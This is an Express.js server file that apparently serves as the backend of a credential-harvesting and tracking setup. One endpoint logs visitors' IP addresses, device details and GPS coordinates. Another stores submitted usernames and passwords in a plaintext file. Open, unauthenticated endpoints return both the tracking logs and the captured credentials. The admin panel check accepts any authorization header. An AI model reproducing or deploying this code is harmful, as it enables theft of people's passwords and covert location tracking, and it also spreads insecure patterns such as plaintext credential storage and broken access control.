const express = require("express");
const fs = require("fs");
const path = require("path");
const cors = require("cors");
require("dotenv").config(); // Load environment variables

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(cors());
app.use(express.static(path.join(__dirname, "public")));

// Tracking endpoint
app.post("/tracker", (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || req.connection.remoteAddress;
  const cleanIp = ip ? ip.split(',')[0].trim() : 'Unknown';
  const userAgent = req.body.userAgent || "Unknown";
  const deviceType = req.body.deviceType || "Unknown";
  const latitude = req.body.latitude || "Unknown Latitude";
  const longitude = req.body.longitude || "Unknown Longitude";
  const logData = req.body;

  const log = `\n----------------------------------------
  TRACKING LOG ENTRY
  ----------------------------------------
  Timestamp: ${new Date().toISOString()}
  IP: ${cleanIp}
  User-Agent: ${userAgent}
  Device Type: ${deviceType}
  Location: Latitude: ${latitude}, Longitude: ${longitude}
  Event Type: ${logData.type}
  Data: ${JSON.stringify(logData, null, 2)}
  ----------------------------------------
  `;

  fs.appendFile("tracker.log", log, err => {
    if (err) {
      console.error("Tracker log failed:", err);
      return res.sendStatus(500);
    }
    res.sendStatus(200);
  });
});

// View logs
app.get("/logs", (req, res) => {
  fs.readFile("tracker.log", "utf8", (err, data) => {
    if (err) {
      console.error("Failed to read log file:", err);
      return res.status(500).send("Failed to fetch logs.");
    }
    const logs = data.split("\n\n").map(log => log.trim()).filter(Boolean);
    res.json({ logs });
  });
});

// Save credentials
app.post("/save-credentials", (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res.status(400).send("Username and password are required.");
  }

  const credentials = `Username: ${username}, Password: ${password}\n`;

  fs.appendFile("user_credentials.txt", credentials, (err) => {
    if (err) {
      console.error("Failed to save credentials:", err);
      return res.status(500).send("Failed to save credentials.");
    }

    res.status(200).send("Credentials saved successfully.");
  });
});

// View credentials
app.get("/credentials", (req, res) => {
  fs.readFile("user_credentials.txt", "utf8", (err, data) => {
    if (err) {
      console.error("Failed to read credentials file:", err);
      return res.status(500).send("Failed to fetch credentials.");
    }
    const credentials = data.split("\n").map(cred => cred.trim()).filter(Boolean);
    res.json({ credentials });
  });
});

// Admin login using env vars
app.post("/admin-login", (req, res) => {
  const { username, password } = req.body;

  const adminUsername = process.env.ADMIN_USERNAME;
  const adminPassword = process.env.ADMIN_PASSWORD;

  if (username === adminUsername && password === adminPassword) {
    res.json({ success: true, message: "Login successful!" });
  } else {
    res.json({ success: false, message: "Invalid username or password." });
  }
});

// Serve login page
app.get("/login", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "login.html"));
});

// Serve the admin panel (only after login)
app.get("/admin-panel", (req, res) => {
  // Check if the user is authenticated (e.g., using a session or token in the future)
  if (!req.headers["authorization"]) {
    return res.redirect("/login");
  }
  res.sendFile(path.join(__dirname, "public", "admin-panel.html"));
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server is running at http://localhost:${PORT}`);
});
